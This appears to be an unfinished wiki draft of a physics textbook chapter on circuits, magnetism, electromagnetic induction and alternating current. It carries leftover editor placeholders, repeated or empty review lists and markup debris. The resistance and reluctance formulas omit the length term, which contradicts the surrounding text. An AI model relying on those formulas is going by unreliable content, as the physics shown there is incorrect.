At this point we still don't know what the total current or total resistance for this parallel circuit is, so we can't apply Ohm's Law
to the rightmost (&quot;Total&quot;) column. However, if we think carefully about what is happening it should become apparent that the total
current must equal the sum of all individual resistor (&quot;branch&quot;) currents: 

[[Image:Fhsst_electricity82.png|Fhsst_electricity82.png]]

As the total current exits the negative (-) battery terminal at point 8 and travels through the circuit, some of the flow splits off at
point 7 to go up through &lt;math&gt;R_1&lt;/math&gt;, some more splits off at point 6 to go up through &lt;math&gt;R_2&lt;/math&gt;, and the remainder goes up through &lt;math&gt;R_3&lt;/math&gt;.
Like a river branching into several smaller streams, the combined flow rates of all streams must equal the flow rate of the whole river. The
same thing is encountered where the currents through &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and &lt;math&gt;R_3&lt;/math&gt; join to flow back to the positive terminal of the battery
(+) toward point 1: the flow of electrons from point 2 to point 1 must equal the sum of the (branch) currents through &lt;math&gt;R_1&lt;/math&gt;, &lt;math&gt;R_2&lt;/math&gt;, and
&lt;math&gt;R_3&lt;/math&gt;. 

This is the second principle of parallel circuits: the total circuit current is equal to the sum of the individual branch currents. Using
this principle, we can fill in the &lt;math&gt;I_T&lt;/math&gt; spot on our table with the sum of &lt;math&gt;I_{R1}&lt;/math&gt;, &lt;math&gt;I_{R2}&lt;/math&gt;, and &lt;math&gt;I_{R3}&lt;/math&gt;: 


[[Image:Fhsst_electricity83.png|Fhsst_electricity83.png]]

Finally, applying Ohm's Law to the rightmost (&quot;Total&quot;) column, we can calculate the total circuit resistance: 

[[Image:Fhsst_electricity84.png|Fhsst_electricity84.png]]

Please note something very important here. The total circuit resistance is only 625 &lt;math&gt;\Omega&lt;/math&gt;: ''less'' than any one of the
individual resistors. In the series circuit, where the total resistance was the sum of the individual resistances, the total was
bound to be ''greater'' than any one of the resistors individually. Here in the parallel circuit, however, the opposite is
true: we say that the individual resistances ''diminish'' rather than ''add'' to make the total. This principle completes our
triad of &quot;rules&quot; for parallel circuits, just as series circuits were found to have three rules for voltage, current, and resistance.
Mathematically, the relationship between total resistance and individual resistances in a parallel circuit looks like this: 

[[Image:Fhsst_electricity85.png|Fhsst_electricity85.png]]

The same basic form of equation works for ''any'' number of resistors connected together in parallel, just add as many ''1/R'' terms
on the denominator of the fraction as needed to accommodate all parallel resistors in the circuit.</text>

= Power calculations =

When calculating the power dissipation of resistive components, use any one of the three power equations to derive and answer from values
of voltage, current, and/or resistance pertaining to each component: 

[[Image:Fhsst_electricity86.png|Fhsst_electricity86.png]]

This is easily managed by adding another row to our familiar table of voltages, currents, and resistances: 

[[Image:Fhsst_electricity87.png|Fhsst_electricity87.png]]

Power for any particular table column can be found by the appropriate Ohm's Law equation (''appropriate'' based on what figures are
present for ''E'', ''I'', and ''R'' in that column). 

An interesting rule for total power versus individual power is that it is additive for ''any'' configuration of circuit: series,
parallel, series/parallel, or otherwise. Power is a measure of rate of work, and since power dissipated ''must'' equal the total
power applied by the source(s) (as per the Law of Conservation of Energy in physics), circuit configuration has no effect on the mathematics.</text>

= Correct use of Ohm's Law =

One of the most common mistakes made by beginning electronics students in their application of Ohm's Laws is mixing the contexts of voltage,
current, and resistance. In other words, a student might mistakenly use a value for I through one resistor and the value for ''E'' across a
set of interconnected resistors, thinking that they'll arrive at the resistance of that one resistor. Not so! Remember this important
rule: The variables used in Ohm's Law equations must be ''common'' to the same two points in the circuit under
consideration. I cannot overemphasize this rule. This is especially important in series-parallel combination circuits where nearby
components may have different values for both voltage drop ''and'' current. 

When using Ohm's Law to calculate a variable pertaining to a single component, be sure the voltage you're referencing is solely across
that single component and the current you're referencing is solely through that single component and the resistance you're referencing is
solely for that single component. Likewise, when calculating a variable pertaining to a set of components in a circuit, be sure that
the voltage, current, and resistance values are specific to that complete set of components only! A good way to remember this is to
pay close attention to the ''two points'' terminating the component or set of components being analyzed, making sure that the
voltage in question is across those two points, that the current in question is the electron flow from one of those points all the way to
the other point, that the resistance in question is the equivalent of a single resistor between those two points, and that the power in
question is the total power dissipated by all components between those two points. 

The &quot;table&quot; method presented for both series and parallel circuits in this chapter is a good way to keep the context of Ohm's Law
correct for any kind of circuit configuration. In a table like the one shown below, you are only allowed to apply an Ohm's Law equation
for the values of a single ''vertical'' column at a time:  

[[Image:Fhsst_electricity88.png|Fhsst_electricity88.png]]

Deriving values ''horizontally'' across columns is allowable as per the principles of series and parallel circuits: 

[[Image:Fhsst_electricity89.png|Fhsst_electricity89.png]]


[[Image:Fhsst_electricity90.png|Fhsst_electricity90.png]]

Not only does the &quot;table&quot; method simplify the management of all relevant quantities, it also facilitates cross-checking of answers by
making it easy to solve for the original unknown variables through other methods, or by working backwards to solve for the initially
given values from your solutions. For example, if you have just solved for all unknown voltages, currents, and resistances in a
circuit, you can check your work by adding a row at the bottom for power calculations on each resistor, seeing whether or not all the
individual power values add up to the total power. If not, then you must have made a mistake somewhere! While this technique of
&quot;cross-checking&quot; your work is nothing new, using the table to arrange all the data for the cross-check(s) results in a minimum of
confusion.</text>

= Conductor Size =

It should be common-sense knowledge that liquids flow through large-diameter pipes easier than they do through small-diameter pipes
(if you would like a practical illustration, try drinking a liquid through straws of different diameters). The same general principle
holds for the flow of electrons through conductors: the broader the cross-sectional area (thickness) of the conductor, the more room for
electrons to flow, and consequently, the easier it is for flow to occur (less resistance). 

Electrical wire is usually round in cross-section (although there are some unique exceptions to this rule), and comes in two basic
varieties: solid and stranded. Solid copper wire is just as it sounds: a single, solid strand of copper the whole length of the wire.
Stranded wire is composed of smaller strands of solid copper wire twisted together to form a single, larger conductor. The greatest
benefit of stranded wire is its mechanical flexibility, being able to withstand repeated bending and twisting much better than solid copper
(which tends to fatigue and break after time).</text>

= Fuses =

Normally, the ampacity rating of a conductor is a circuit design limit never to be intentionally exceeded, but there is an application where
ampacity exceedence is expected: in the case of ''fuses''.  

A fuse is nothing more than a short length of wire designed to melt and separate in the event of excessive current. Fuses are always
connected in series with the component(s) to be protected from overcurrent, so that when the fuse ''blows'' (opens) it will open
the entire circuit and stop current through the component(s). A fuse connected in one branch of a parallel circuit, of course, would not
affect current through any of the other branches. 

Normally, the thin piece of fuse wire is contained within a safety sheath to minimize hazards of arc blast if the wire burns open with
violent force, as can happen in the case of severe overcurrents. In the case of small automotive fuses, the sheath is transparent so that
the fusible element can be visually inspected. Residential wiring used to commonly employ screw-in fuses with glass bodies and a thin,
narrow metal foil strip in the middle.</text>

* ''REVIEW:''
* A ''circuit'' is an unbroken loop of conductive material that allows electrons to flow through continuously without beginning or end.
* If a circuit is &quot;broken,&quot; that means it's conductive elements no longer form a complete path, and continuous electron flow cannot occur in it.
* The location of a break in a circuit is irrelevant to its inability to sustain continuous electron flow. ''Any'' break, ''anywhere'' in a circuit prevents electron flow throughout the circuit.

* ''REVIEW:''
* Electrons can be motivated to flow through a conductor by the same force manifested in static electricity.
* ''Voltage'' is the measure of specific potential energy (potential energy per unit charge) between two locations. In layman's terms, it is the measure of &quot;push&quot; available to motivate electrons.
* Voltage, as an expression of potential energy, is always relative between two locations, or points. Sometimes it is called a voltage &quot;drop.&quot;
* When a voltage source is connected to a circuit, the voltage will cause a uniform flow of electrons through that circuit called a ''current''.
* In a single (one loop) circuit, the amount of current at any point is the same as the amount of current at any other point.
* If a circuit containing a voltage source is broken, the full voltage of that source will appear across the points of the break.
* The +/- orientation a voltage drop is called the ''polarity''. It is also relative between two points.

* ''REVIEW:''
* ''Resistance'' is the measure of opposition to electric current.
* A ''short circuit'' is an electric circuit offering little or no resistance to the flow of electrons. Short circuits are dangerous with high voltage power sources because the high currents encountered can cause large amounts of heat energy to be released.
* An ''open circuit'' is one where the continuity has been broken by an interruption in the path for electrons to flow.
* A ''closed circuit'' is one that is complete, with good continuity throughout.
* A device designed to open or close a circuit under controlled conditions is called a ''switch''.
* The terms ''&quot;open&quot;'' and ''&quot;closed&quot;'' refer to switches as well as entire circuits. An open switch is one without continuity: electrons cannot flow through it. A closed switch is one that provides a direct (low resistance) path for electrons to flow through.

* ''REVIEW:''
* Connecting wires in a circuit are assumed to have zero resistance unless otherwise stated.
* Wires in a circuit can be shortened or lengthened without impacting the circuit's function - all that matters is that the components are attached to one another in the same sequence.
* Points directly connected together in a circuit by zero resistance (wire) are considered to be ''electrically common''.
* Electrically common points, with zero resistance between them, will have zero voltage dropped between them, regardless of the magnitude of current (ideally).
* The voltage or resistance readings referenced between sets of electrically common points will be the same.
* These rules apply to ''ideal'' conditions, where connecting wires are assumed to possess absolutely zero resistance. In real life this will probably not be the case, but wire resistances should be low enough so that the general principles stated here still hold.

* ''REVIEW:''

= Permanent magnets =

Magnetism has been known to mankind for many thousands of years. ''Lodestone'', a magnetized form of the iron oxide mineral
''magnetite'' which has the property of attracting iron objects, is referred to in old European and Asian historical
records, around 800 BC in Europe and earlier in the East, around 2600 BC. The root of the English word magnet is the Greek word
magnes, thought to be derived from Magnesia in Asia Minor, once an important source of lodestone.

Lodestone was used as a navigational compass as it was found to orient itself in a north-south direction if left free to rotate by
suspension on a string or on a float in water. 

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
A compass is a navigational instrument for finding directions.  It consists of a magnetised pointer free to align itself
accurately with Earth's magnetic field. A compass provides a  known reference direction which is of great assistance in
navigation. The cardinal points are north, south, east and west.  A compass can be used in conjunction with a clock and a sextant
to provide a very accurate navigation capability. This device  greatly improved maritime trade by making travel safer and more
efficient.  A compass can be any magnetic device using a needle to indicate  the direction of the magnetic north of a planet's magnetosphere.
Any instrument with a magnetized bar or needle turning freely  upon a pivot and pointing in a northerly and southerly direction
can be considered a compass.
&lt;/blockquote&gt;

In 1269, Frenchmen Peter Peregrinus and Pierre de Maricourt, using a compass and a lodestone, found that the magnetic force of the
lodestone at the opposite ends, which they defined to be the poles of the magnet. They found that like poles repel one another whilst
unlike poles attract. It was also discovered that poles always occur in pairs, it is impossible to isolate a single pole, a
monopole. Breaking a piece of lodestone in half would result in two pieces, each with its own pair of poles.

[[Image:Fhsst_electromag1.png|Fhsst_electromag1.png]]

In 1600 the English physician William Gilbert concluded that the Earth itself is a magnet and that the Earth's magnetic poles are
approximately aligned along the Earth's axis of rotation. 

The British scientist, John Michell, discovered in 1750 that the magnitude of forces between the poles of magnets follows an
inverse square law  i.e. it varies inversely as the square of the distance of separation.

Magnetic forces are a result of magnetic fields. The magnetic field is an entity produced by moving electric charges that exerts
a force on other moving charges. In permanent ferromagnets the magnetic field is produced by the spin of electrons within the
material being in the same direction.

By placing a magnet underneath a piece of paper and sprinkling iron filings on top one can map the magnetic field. The filings
align themselves parallel to the field. Magnetic fields can be represented by magnetic field lines which are parallel to the
magnetic field and whose spacing represents the relative strength of the magnetic field. The strength of the magnetic field is
referred to as the magnetic flux. Magnetic field lines form closed loops. In a bar magnet magnetic field lines emerge at one pole and
then curve around to the other pole with the rest of the loop being inside the magnet.

[[Image:Fhsst_electromag2.png|Fhsst_electromag2.png]]  

Opposite poles of a magnet attract each other and bringing them together results in their magnetic field lines converging.

Like poles of a magnet repel each other and bringing them together results in their magnetic field lines diverging.

Ferromagnetism is a phenomenon exhibited by materials like iron, nickel or cobalt. They become magnetized in an external magnetic
field by aligning their electron spins with the external field. Ferromagnetic materials retain their magnetism even when the field
is removed as the electron spins retain their orientation. At high enough temperatures ferromagnets lose their orientation as the
heat causes the orientations of electron orbits within iron to become randomized.

Iron always magnetizes so as to be attracted to a magnet, regardless of which magnetic pole is brought toward the
unmagnetized iron:

[[Image:Fhsst_electromag3.png|Fhsst_electromag3.png]]

The ability of a ferromagnetic material tends to retain its magnetization after an external field is removed is called it's
''retentivity''.

Paramagnetic materials are materials like aluminum or platinum which become magnetized in an external magnetic field in a similar
way to ferromagnetic materials but lose their magnetism when the external magnetic field is removed.

Diamagnetism is exhibited by materials like copper or bismuth which become magnetized in a magnetic field with a polarity
opposite to the external magnetic field. Unlike iron, they are slightly repelled by a magnet

[[Image:Fhsst_electromag4.png|Fhsst_electromag4.png]]

The cause of Earth's magnetic field is not known for certain, but is possibly explained by the dynamo theory. The magnetic field
extends several tens of thousands of kilometers into space. The field is approximately a magnetic dipole, with one pole near the
geographic north pole and the other near the geographic south pole. An imaginary line joining the magnetic poles would be
inclined by approximately 11.3 from the planet's axis of rotation. The location of the magnetic poles is not static but wanders as
much as several kilometers a year. The two poles wander independently of each other and are not at exact opposite
positions on the globe. Currently the south magnetic pole is further from the geographic south pole than than north magnetic
pole is from the north geographic pole.

The strength of the field at the Earth's surface at this time ranges from less than 30 microteslas (0.3 gauss) in an area
including most of South America and South Africa to over 60 microteslas (0.6 gauss) around the magnetic poles in northern
Canada and south of Australia, and in part of Siberia. The field is similar to that of a bar magnet, but this similarity is
superficial. The magnetic field of a bar magnet, or any other type of permanent magnet, is created by the coordinated motions of
electrons (negatively charged particles) within iron atoms. The Earth's core, however, is hotter than 1043 K, the temperature at
which the orientations of electron orbits within iron become randomized. Therefore the Earth's magnetic field is not caused by
magnetised iron deposits, but mostly by electric currents (known as telluric currents). Another feature that distinguishes the
Earth magnetically from a bar magnet is its magnetosphere.

A magnetosphere is the region around an astronomical object, in which phenomena are dominated by its magnetic field. Earth is
surrounded by a magnetosphere, as are the magnetized planets Jupiter, Saturn, Uranus and Neptune. Mercury is magnetized, but
too weakly to trap plasma. Mars has patchy surface magnetization.

The distant field of Earth is greatly modified by the solar wind, a hot outflow from the sun, consisting of solar ions (mainly
hydrogen) moving at about 400 km/s . Earth's magnetic field forms an obstacle to the solar wind.

The Earth's magnetic field reverses at intervals, ranging from tens of thousands to many millions of years, with an average
interval ofnbsp; 250,000 years. It is believed that this last occurred some 780,000 years ago. The mechanism responsible for geomagnetic
reversals is not well understood. When the North reappears in the opposite direction, we would interpret this as a reversal, whereas
turning off and returning in the same direction is called a geomagnetic excursion. At present, the overall geomagnetic field
is becoming weaker at a rate which would, if it continues, cause the field to disappear, albeit temporarily, by about around
3000-4000 AD. The deterioration began roughly 150 years ago and has accelerated in the past several years. So far the strength of
the Earth's field has decreased by 10 to 15 percent.</text>

= Electromagnetism =

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
The discovery of the relationship between magnetism and electricity was, like so many other scientific discoveries, stumbled upon almost
by accident. The Danish physicist Hans Christian Oersted was lecturing one day in 1820 on the ''possibility'' of electricity
and magnetism being related to one another, and in the process demonstrated it conclusively by experiment in front of his whole
class! By passing an electric current through a metal wire suspended above a magnetic compass, Oersted was able to produce a definite
motion of the compass needle in response to the current. What began as conjecture at the start of the class session was confirmed as fact
at the end. Needless to say, Oersted had to revise his lecture notes for future classes! His serendipitous discovery paved the way for a
whole new branch of science: electromagnetics.
&lt;/blockquote&gt;

Detailed experiments showed that the magnetic field produced by an electric current is always oriented perpendicular to the direction of
flow. A simple method of showing this relationship is called the ''left-hand rule''. Simply stated, the left-hand rule says that
the magnetic flux lines produced by a current-carrying wire will be oriented the same direction as the curled fingers of a person's left
hand (in the &quot;hitchhiking&quot; position), with the thumb pointing in the direction of electron flow:

[[Image:Fhsst_electromag5.png|Fhsst_electromag5.png]]

The magnetic field encircles this straight piece of current-carrying wire, the magnetic flux lines having no definite &quot;north&quot; or &quot;south'
poles.

'''Note: Need to add wires attracting or wires repelling''' 

While the magnetic field surrounding a current-carrying wire is indeed interesting, it is quite weak for common amounts of current, able to
deflect a compass needle and not much more. To create a stronger magnetic field force (and consequently, more field flux) with the same
amount of electric current, we can wrap the wire into a coil shape, where the circling magnetic fields around the wire will join to create
a larger field with a definite magnetic (north and south) polarity: 

[[Image:Fhsst_electromag6.png|Fhsst_electromag6.png]]

The amount of magnetic field force generated by a coiled wire is proportional to the current through the wire multiplied by the number
of &quot;turns&quot; or &quot;wraps&quot; of wire in the coil. This field force is called ''magnetomotive force'' (mmf), and is very much analogous to
electromotive force (E) in an electric circuit.

An ''electromagnet'' is a piece of wire intended to generate a magnetic field with the passage of electric current through it.
Though all current-carrying conductors produce magnetic fields, an electromagnet is usually constructed in such a way as to maximize the
strength of the magnetic field it produces for a special purpose. Electromagnets find frequent application in research, industry,
medical, and consumer products.

As an electrically-controllable magnet, electromagnets find application in a wide variety of &quot;electromechanical&quot; devices: machines
that effect mechanical force or motion through electrical power. Perhaps the most obvious example of such a machine is the
''electric motor''.


[[Image:Fhsst_electromag7.png|Fhsst_electromag7.png]]

Relays can be constructed to actuate multiple switch contacts, or operate them in &quot;reverse&quot; (energizing the coil will ''open'' the
switch contact, and unpowering the coil will allow it to spring closed again).

= Magnetic units of measurement =

If the burden of two systems of measurement for common quantities (English vs. metric) throws your mind into confusion, this is not the
place for you! Due to an early lack of standardization in the science of magnetism, we have been plagued with no less than three complete
systems of measurement for magnetic quantities. 

First, we need to become acquainted with the various quantities associated with magnetism. There are quite a few more quantities to
be dealt with in magnetic systems than for electrical systems. With electricity, the basic quantities are Voltage (E), Current (I),
Resistance (R), and Power (P). The first three are related to one another by Ohm's Law (''E=IR'' ; ''I=E/R'';  ''R=E/I''), while Power is related to
voltage, current, and resistance by Joule's Law (''P=IE''; &lt;math&gt;P=I^{2}R&lt;/math&gt;; &lt;math&gt;P=\frac{E^{2}}{R}&lt;/math&gt;).

With magnetism, we have the following quantities to deal with:


'''Magnetomotive Force''' - The quantity of magnetic field force, or &quot;push.&quot; Analogous to electric voltage (electromotive force).


'''Field Flux''' - The quantity of total field effect, or &quot;substance&quot; of the field. Analogous to electric current.


'''Field Intensity''' - The amount of field force (mmf) distributed over the length of the electromagnet. Sometimes referred to as ''Magnetizing Force''.


'''Flux Density''' - The amount of magnetic field flux concentrated in a given area.


'''Reluctance''' - The opposition to magnetic field flux through a given volume of space or material. Analogous to electrical resistance.


'''Permeability''' - The specific measure of a material's acceptance of magnetic flux, analogous to the specific resistance of a conductive material (&lt;math&gt;\rho&lt;/math&gt;), except inverse (greater permeability means easier passage of magnetic flux, whereas greater specific resistance means more difficult passage of electric current). 



But wait . . . the fun is just beginning! Not only do we have more quantities to keep track of with magnetism than with electricity, but
we have several different systems of unit measurement for each of these quantities. As with common quantities of length, weight,
volume, and temperature, we have both English and metric systems. However, there is actually more than one metric system of units, and
multiple metric systems are used in magnetic field measurements! One is called the ''cgs'', which stands for
'''C'''entimeter-'''G'''ram-'''S'''econd, denoting the root measures upon which the whole system is based. The other was
originally known as the ''mks'' system, which stood for '''M'''eter-'''K'''ilogram-'''S'''econd, which was later
revised into another system, called ''rmks'', standing for '''R'''ationalized '''M'''eter-'''K'''ilogram-'''S'''econd. 
This ended up being adopted as an international standard and renamed ''SI'' ('''S'''ysteme '''I'''nternational).

'''RIAAN Note: NEED TO INSERT TABLE HERE'''

And yes, the &lt;math&gt;\mu&lt;/math&gt; symbol is really the same as the metric prefix &quot;micro.&quot; I find this especially confusing, using the exact same
alphabetical character to symbolize both a specific quantity and a general metric prefix!

As you might have guessed already, the relationship between field force, field flux, and reluctance is much the same as that between the
electrical quantities of electromotive force (E), current (I), and resistance (R). This provides something akin to an Ohm's Law for
magnetic circuits:

{| 
|A comparison of &quot;Ohm's Law&quot; for electric and magnetic circuits:
|- 
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | &lt;math&gt;E=I\ R&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | &lt;math&gt;mmf=\Phi \Re&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | '''Electrical'''
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | '''Magnetic'''
|}

And, given that permeability is inversely analogous to specific resistance, the equation for finding the reluctance of a magnetic
material is very similar to that for finding the resistance of a conductor:

{| 
|A comparison of electrical and magnetic opposition:
|- 
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | &lt;math&gt;R=\rho \frac{1}{A}&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | &lt;math&gt;\Re =\frac{1}{\mu \ A}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | '''Electrical'''
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | '''Magnetic'''
|}

In either case, a longer piece of material provides a greater opposition, all other factors being equal. Also, a larger
cross-sectional area makes for less opposition, all other factors being equal.</text>

= Electromagnetic induction =
While Oersted's surprising discovery of electromagnetism paved the way for more practical ''applications'' of electricity, it was
Michael Faraday who gave us the key to the practical ''generation'' of electricity: electromagnetic induction.
Faraday discovered that a voltage would be generated across a length of wire if that wire was exposed to a perpendicular magnetic field
flux of changing intensity.

An easy way to create a magnetic field of changing intensity is to move a permanent magnet next to a wire or coil of wire. Remember: the
magnetic field must increase or decrease in intensity ''perpendicular'' to the wire (so that the lines of flux &quot;cut
across&quot; the conductor), or else no voltage will be induced:

[[Image:Fhsst_electromag9.png|Fhsst_electromag9.png]]

Faraday was able to mathematically relate the rate of change of the magnetic field flux with induced voltage (note the use of a lower-case
letter &quot;e&quot; for voltage. This refers to ''instantaneous'' voltage, or voltage at a specific point in time, rather than a steady,
stable voltage.):

{| 
|- 
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | &lt;math&gt;e=N \frac{d\ \Phi}{d\ t}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''where'':
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''e'' = (Instantaneous) induced voltage in volts
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''N'' = Number of turns in wire coil (straight wire = 1) (N.B, there should be a -N for equation).
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | &lt;math&gt;\Phi&lt;/math&gt; = Magnetic flux in webers
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''t'' = Time in seconds
|}


The &quot;d&quot; terms are standard calculus notation, representing rate-of-change of flux over time. ''&quot;N&quot;'' stands for the number of turns,
or wraps, in the wire coil (assuming that the wire is formed in the shape of a coil for maximum electromagnetic efficiency).

This phenomenon is put into obvious practical use in the construction of electrical generators, which use mechanical power to move a
magnetic field past coils of wire to generate voltage. However, this is by no means the only practical use for this principle.

If we recall that the magnetic field produced by a current-carrying wire was always perpendicular to that wire, and that the flux
intensity of that magnetic field varied with the amount of current through it, we can see that a wire is capable of inducing a voltage
''along its own length'' simply due to a change in current through it. This effect is called ''self-induction:'' a changing
magnetic field produced by changes in current through a wire inducing voltage along the length of that same wire. If the magnetic field
flux is enhanced by bending the wire into the shape of a coil, and/or wrapping that coil around a material of high permeability, this effect
of self-induced voltage will be more intense. A device constructed to take advantage of this effect is called an ''inductor'', and will
be discussed in greater detail in the next chapter. 

A device specifically designed to produce the effect of mutual inductance between two or more coils is called a
''transformer''.

Because magnetically-induced voltage only happens when the magnetic field flux is ''changing'' in strength relative to the wire,
mutual inductance between two coils can only happen with alternating (changing - AC) voltage, and not with direct (steady - DC) voltage.
The only applications for mutual inductance in a DC system is where some means is available to switch power on and off to the coil (thus
creating a ''pulsing'' DC voltage), the induced voltage peaking at every pulse.

A very useful property of transformers is the ability to transform voltage and current levels according to a simple ratio, determined by
the ratio of input and output coil turns. If the energized coil of a transformer is energized by an AC voltage, the amount of AC voltage
induced in the unpowered coil will be equal to the input voltage multiplied by the ratio of output to input wire turns in the coils.
Conversely, the current through the windings of the output coil compared to the input coil will follow the opposite ratio: if the
voltage is increased from input coil to output coil, the current will be decreased by the same proportion. This action of the transformer
is analogous to that of mechanical gear, belt sheave, or chain sprocket ratios:

[[Image:Fhsst_electromag10.png|Fhsst_electromag10.png]]

A transformer designed to output more voltage than it takes in across the input coil is called a &quot;step-up&quot; transformer, while one designed
to do the opposite is called a &quot;step-down,&quot; in reference to the transformation of voltage that takes place. The current through each
respective coil, of course, follows the exact opposite proportion.</text>

= Alternating Current =

Most students of electromagnetism begin their study with what is known as ''direct current'' (DC).
In a DC system, the current (the flow of charged particles) is in a constant direction.
In a DC system, the voltage across each part has a constant polarity.
DC is the kind of electric power made by a battery (with
definite positive and negative terminals), or the kind of charge generated by rubbing certain types of materials against each other.

As useful and as easy to understand as DC is, it is not the only &quot;kind&quot; of electric power in use. Certain sources of electric power (most
notably, rotary electro-mechanical generators) naturally produce voltages alternating in polarity, reversing positive and negative over
time. Either as a voltage switching polarity or as a current switching direction back and forth, this &quot;kind&quot; of electric power is
known as Alternating Current (AC): 

[[Image:Fhsst_electromag11.png|Fhsst_electromag11.png]]

Whereas the familiar battery symbol is used as a generic symbol for any DC voltage source, the circle with the wavy line inside is the
generic symbol for any AC voltage source. 

One might wonder why anyone would bother with such a thing as AC. It is true that in some cases AC holds no practical advantage over DC.
In applications where electricity is used to dissipate energy in the form of heat, the polarity or direction of current is irrelevant, so
long as there is enough voltage and current to the load to produce the desired heat (power dissipation). However, with AC it is possible to
build electric generators, motors and power distribution systems that are far more efficient than DC, and so we find AC used predominately
across the world in high power applications. To explain the details of why this is so, a bit of background knowledge about AC is
necessary.

If a machine is constructed to rotate a magnetic field around a set of stationary wire coils with the turning of a shaft, AC voltage will be
produced across the wire coils as that shaft is rotated, in accordance with Faraday's Law of electromagnetic induction. This is the basic
operating principle of an AC generator, also known as an ''alternator'':

[[Image:Fhsst_electromag12.png|Fhsst_electromag12.png]]

Notice how the polarity of the voltage across the wire coils reverses as the opposite poles of the rotating magnet pass by. Connected to a
load, this reversing voltage polarity will create a reversing current direction in the circuit. The faster the alternator's shaft is
turned, the faster the magnet will spin, resulting in an alternating voltage and current that switches directions more often in a given
amount of time.

While DC generators work on the same general principle of electromagnetic induction, their construction is not as simple as
their AC counterparts. With a DC generator, the coil of wire is mounted in the shaft where the magnet is on the AC alternator, and
electrical connections are made to this spinning coil via stationary carbon &quot;brushes&quot; contacting copper strips on the rotating shaft. All
this is necessary to switch the coil's changing output polarity to the external circuit so the external circuit sees a constant polarity:

[[Image:Fhsst_electromag13.png|Fhsst_electromag13.png]]

The generator shown above will produce two pulses of voltage per revolution of the shaft, both pulses in the same direction (polarity).
In order for a DC generator to produce ''constant'' voltage, rather than brief pulses of voltage once every 1/2 revolution, there
are multiple sets of coils making intermittent contact with the brushes. The diagram shown above is a bit more simplified than what
you would see in real life.

The problems involved with making and breaking electrical contact with a moving coil should be obvious (sparking and heat), especially if the
shaft of the generator is revolving at high speed. If the atmosphere surrounding the machine contains flammable or explosive vapors, the
practical problems of spark-producing brush contacts are even greater. An AC generator (alternator) does not require brushes and commutators
to work, and so is immune to these problems experienced by DC generators.

The benefits of AC over DC with regard to generator design is also reflected in electric motors. While DC motors require the use of
brushes to make electrical contact with moving coils of wire, AC motors do not. In fact, AC and DC motor designs are very similar to
their generator counterparts (identical for the sake of this tutorial), the AC motor being dependent upon the reversing magnetic
field produced by alternating current through its stationary coils of wire to rotate the rotating magnet around on its shaft, and the DC
motor being dependent on the brush contacts making and breaking connections to reverse current through the rotating coil every 1/2
rotation (180 degrees). 

So we know that AC generators and AC motors tend to be simpler than DC generators and DC motors. This relative simplicity translates into
greater reliability and lower cost of manufacture. But what else is AC good for? Surely there must be more to it than design details of
generators and motors! Indeed there is. There is an effect of electromagnetism known as ''mutual induction'', whereby two or
more coils of wire placed so that the changing magnetic field created by one induces a voltage in the other. If we have two mutually
inductive coils and we energize one coil with AC, we will create an AC voltage in the other coil. When used as such, this device is known as
a ''transformer'':

[[Image:Fhsst_electromag14.png|Fhsst_electromag14.png]]

The fundamental significance of a transformer is its ability to step voltage up or down from the powered coil to the unpowered coil. The
AC voltage induced in the unpowered (&quot;secondary&quot;) coil is equal to the AC voltage across the powered (&quot;primary&quot;) coil multiplied by the ratio
of secondary coil turns to primary coil turns. If the secondary coil is powering a load, the current through the secondary coil is just the
opposite: primary coil current multiplied by the ratio of primary to secondary turns. This relationship has a very close mechanical
analogy, using torque and speed to represent voltage and current, respectively:

[[Image:Fhsst_electromag15.png|Fhsst_electromag15.png]]

If the winding ratio is reversed so that the primary coil has less turns than the secondary coil, the transformer &quot;steps up&quot; the voltage
from the source level to a higher level at the load: 

[[Image:Fhsst_electromag16.png|Fhsst_electromag16.png]]

The transformer's ability to step AC voltage up or down with ease gives AC an advantage unmatched by DC in the realm of power
distribution. When transmitting electrical power over long distances, it is far more efficient to do so with stepped-up voltages and
stepped-down currents (smaller-diameter wire with less resistive power losses), then step the voltage back down and the current back up for
industry, business, or consumer use use.


[[Image:Fhsst_electromag17.png|Fhsst_electromag17.png]]

Transformer technology has made long-range electric power distribution practical. Without the ability to efficiently step voltage up and
down, it would be cost-prohibitive to construct power systems for anything but close-range (within a few miles at most) use.

As useful as transformers are, they only work with AC, not DC. Because the phenomenon of mutual inductance relies on
''changing'' magnetic fields, and direct current (DC) can only produce steady magnetic fields, transformers simply will not work with
direct current. Of course, direct current may be interrupted (pulsed) through the primary winding of a transformer to create a changing
magnetic field (as is done in automotive ignition systems to produce high-voltage spark plug power from a low-voltage DC battery), but
pulsed DC is not that different from AC. Perhaps more than any other reason, this is why AC finds such widespread application in power
systems.

If we were to follow the changing voltage produced by a coil in an alternator from any point on the sine wave graph to that point when
the wave shape begins to repeat itself, we would have marked exactly one ''cycle'' of that wave. This is most easily shown by
spanning the distance between identical peaks, but may be measured between any corresponding points on the graph. The degree marks on
the horizontal axis of the graph represent the domain of the trigonometric sine function, and also the angular position of our
simple two-pole alternator shaft as it rotates:

[[Image:Fhsst_electromag18.png|Fhsst_electromag18.png]]

Since the horizontal axis of this graph can mark the passage of time as well as shaft position in degrees, the dimension marked for one
cycle is often measured in a unit of time, most often seconds or fractions of a second. When expressed as a measurement, this is often
called the ''period'' of a wave. The period of a wave in degrees is ''always'' 360, but the amount of time one period occupies
depends on the rate voltage oscillates back and forth. 

A more popular measure for describing the alternating rate of an AC voltage or current wave than ''period'' is the rate of that
back-and-forth oscillation. This is called ''frequency''. The modern unit for frequency is the hertz (abbreviated Hz), which
